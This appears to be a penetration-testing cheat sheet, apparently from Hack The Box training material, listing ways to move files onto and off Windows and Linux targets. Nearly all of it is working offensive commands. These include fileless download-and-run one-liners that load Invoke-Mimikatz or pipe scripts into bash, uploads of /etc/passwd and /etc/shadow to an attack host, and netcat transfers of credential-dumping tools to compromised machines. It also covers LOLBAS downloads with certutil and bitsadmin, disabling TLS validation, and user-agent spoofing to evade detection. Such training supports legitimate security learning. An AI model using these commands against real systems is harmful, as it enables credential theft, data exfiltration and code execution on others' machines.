## **Windows File Transfer Methods**
#### **Powershell based decode/ encode**
1. Convert to/from base64:
    1. File to base64 on Linux: `cat file | base64 -w 0; echo`
    2. Base64 to file on Windows: `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CR(...)o="))`
    3. Get md5 file hash on Windows: `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`
    4. Get md5 file hash on Linux: `md5sum id_rsa`
2. PowerShell DownloadFile Method
    1. `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`
    2. `(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')`
3. PowerShell DownloadString - Fileless Method**
    1. `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
    2. ` (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
4. PowerShell Invoke-WebRequest: `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
5. Common Errors with PowerShell:
    1. The parameter -UseBasicParsing: `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
    2. The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel." `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} `
#### **SMB Downloads**
1. Create the SMB Server: `sudo impacket-smbserver share -smb2support /tmp/smbshare`
2. sudo impacket-smbserver share -smb2support /tmp/smbshare: `copy \\192.168.220.133\share\nc.exe`
3. Create the SMB Server with a Username and Password: `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
4. Mount the SMB Server with Username and Password: `net use n: \\192.168.220.133\share /user:test test`
#### **FTP Downloads**
1. `sudo pip3 install pyftpdlib`
2. Setting up a Python3: `sudo python3 -m pyftpdlib --port 21`
3. Transfering Files from an FTP Server Using PowerShell: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
#### *****PowerShell Web Uploads**
1. `pip3 install uploadserver`
2. `python3 -m uploadserver`
3. `PowerShell Script to Upload a File to Python Upload Server:
    1. `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
    2. `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`
4. PowerShell Base64 Web Upload 
    1. `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
    2. `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
#### **SMB Uploads**
1. Installing WebDav Python modules: `sudo pip3 install wsgidav cheroot`
2. Using the WebDav Python module: `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
3. Connecting to the Webdav Share: `dir \\192.168.49.128\DavWWWRoot`
4. Uploading Files using SMB: 
    1. `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\`
    2. `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`
#### **FTP Uploads**
1. `sudo python3 -m pyftpdlib --port 21 --write`
2. PowerShell Upload File: `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
3. Create a Command File for the FTP Client to Upload a File: 
    1. `echo open 192.168.49.128 > ftpcommand.txt`
    2. `echo USER anonymous >> ftpcommand.txt`
    3. `echo binary >> ftpcommand.txt`
    4. `echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt`
    5. `echo bye >> ftpcommand.txt`
    6. `echo bye >> ftpcommand.txt`
    7. `open 192.168.49.128`
    8. `USER anonymous`
    9. `PUT c:\windows\system32\drivers\etc\hosts`
    10. `bye`
## **Linux File Transfer Methods**
1. Check File MD5 hash: `md5sum id_rsa`
2. Encode SSH Key to Base64: `cat id_rsa |base64 -w 0;echo`
3. Decode the File: `echo -n 'LS0tL(...))tLQo=' | base64 -d > id_rsa`
#### **Web Downloads with Wget and cURL**
1. Download a File Using wget: `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
2. Download a File Using cURL: `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
#### **Fileless Attacks Using Linux**
1. Fileless Download with cURL: `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
2. Fileless Download with wget: `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
#### **Download with Bash (/dev/tcp)**
1. Connect to the Target Webserver: `exec 3<>/dev/tcp/10.10.10.32/80`
2. HTTP GET Request: `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
3. Print the Response: `cat <&3`
#### **SSH Downloads**
1. Enabling the SSH Server: `sudo systemctl enable ssh`
2. Starting the SSH Server: `sudo systemctl start ssh`
3. Checking for SSH Listening Port: `netstat -lnpt`
4. Linux - Downloading Files Using SCP: `scp plaintext@192.168.49.128:/root/myroot.txt . `
### **Linux Upload Operations**
1. Start Web Server: `sudo python3 -m pip install --user uploadserver`
2. Pwnbox - Create a Self-Signed Certificate: `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
3. The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver: `mkdir https && cd https`
4. Pwnbox - Start Web Server: `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`
5. Linux - Upload Multiple Files: `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
### **Alternative Web File Transfer Method**
1. Creating a Web Server with Python3: `python3 -m http.server 9999`
2. Creating a Web Server with Python2.7: `python2.7 -m SimpleHTTPServer`
3. Creating a Web Server with PHP: `php -S 0.0.0.0:8000`
4. Creating a Web Server with Ruby: `ruby -run -ehttpd . -p8000`
#### **SCP Upload**
1. File Upload using SCP: `scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/`
## **Transferring Files with Code**
1. Python 2 - Download: `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
2. Python 3 - Download: `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
3. PHP - Downloads a file using PHP file_get_contents() and saves it with file_put_contents(): `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
4. PHP - Downloads a file using PHP fopen(): `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
5. PHP - Downloads a file using PHP and pipes it to bash: `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash` 
6. Ruby - Download a File: `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`
7. Perl - Download a File: `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`
8. JS
```bash
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
9. JS - Download a File Using cscript.exe: `cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`
10. VBScript:
```bash
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
11. VBScript - Download a File using cscript.exe: `cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`
12. Upload Operations using Python3:
    1. Starting the Python uploadserver Module: `python3 -m uploadserver `
    2. Uploading a File Using a Python One-liner: `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`
## **Miscellaneous File Transfer Methods**
#### **NetCat**
1. Connect from attack host to target:
    1. Compromised Machine - Listening on Port 8000: `ncat -l -p 8000 --recv-only > SharpKatz.exe` or `nc -l -p 8000 > SharpKatz.exe`
    2.  Attack Host - Sending File to Compromised machine: 
        1. `wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe`
        2. `nc -q 0 192.168.49.128 8000 < SharpKatz.exe` or `nc -q 0 192.168.49.128 8000 < SharpKatz.exe` Use send-only flag to close connection after file sending.
2. Connect from target to Attack Host (NC): 
    1. Attack host Sending File as Input to Netcat:`sudo nc -l -p 443 -q 0 < SharpKatz.exe`
    2. Compromised Machine Connect to Netcat to Receive the File: `nc 192.168.49.128 443 > SharpKatz.exe`
3. Connect from target to attack host (NCAT):
    1. Attack Host - Sending File as Input to Ncat - `sudo ncat -l -p 443 --send-only < SharpKatz.exe`
    2. Compromised Machine Connect to Ncat to Receive the File: `ncat 192.168.49.128 443 --recv-only > SharpKatz.exe`
4. If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.
    1. NetCat - Sending File as Input to Netcat: `sudo nc -l -p 443 -q 0 < SharpKatz.exe` **OR**
    2. Ncat - Sending File as Input to Ncat: `sudo ncat -l -p 443 --send-only < SharpKatz.exe`
    3. Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File: `cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`
#### **PowerShell Session File Transfer**
1. Basic enumeration with `whoami`, `hostname`, `Test-NetConnection -ComputerName DATABASE01 -Port 5985`
2. Create a PowerShell Remoting Session to DATABASE01: `$Session = New-PSSession -ComputerName DATABASE01`
3. Copy samplefile.txt from our Localhost to the DATABASE01 Session: `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`
4. Copy DATABASE.txt from DATABASE01 Session to our Localhost: `Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`
#### **RDP**
1. Mounting a Linux Folder Using rdesktop: `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`
2. Mounting a Linux Folder Using xfreerdp: `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`
## **Protected File Transfers**
#### **File Encryption on Windows**
1. Download [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)
2. Import module: `Import-Module .\Invoke-AESEncryption.ps1`
3. File Encryption Example: `Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt`
#### **File Encryption on Linux**
1. Encrypting /etc/passwd with openssl: `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`
2. Decrypt passwd.enc with openssl: `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`
## **Catching Files over HTTP/S**
1. Create a Directory to Handle Uploaded Files: `sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
2. Change the Owner to www-data: `sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
3. Create Nginx Configuration File:
    ```bash
        server {
        listen 9001;
        
        location /SecretUploadDirectory/ {
            root    /var/www/uploads;
            dav_methods PUT;
        }
    }
    ```
4. Symlink our Site to the sites-enabled Directory: `sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`
5. Start Nginx: `sudo systemctl restart nginx.service`
6. Verifying Errors:
    1. `tail -2 /var/log/nginx/error.log`
    2. `ss -lnpt | grep 80`
    3. `ps -ef | grep 2811`
7. Remove NginxDefault Configuration: `sudo rm /etc/nginx/sites-enabled/default`
8. Upload File Using cURL:
    1.  `curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`
    2. `sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt `
## **Living off The Land**
1. Using the LOLBAS and GTFOBins Project
2. File Download with Bitsadmin: `bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe`
3. Bitstransfer: `Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"`
4. Certutil: `certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe` or `certutil -urlcache -split -f http://10.10.10.32/nc.exe `
## **Evading Detection**
1. Listing out User Agents: `[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl`
2. Request with Chrome User Agent: 
    1. `$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome`
    2. `Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"`
3. Transferring File with GfxDownloadWrapper.exe: `GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"`
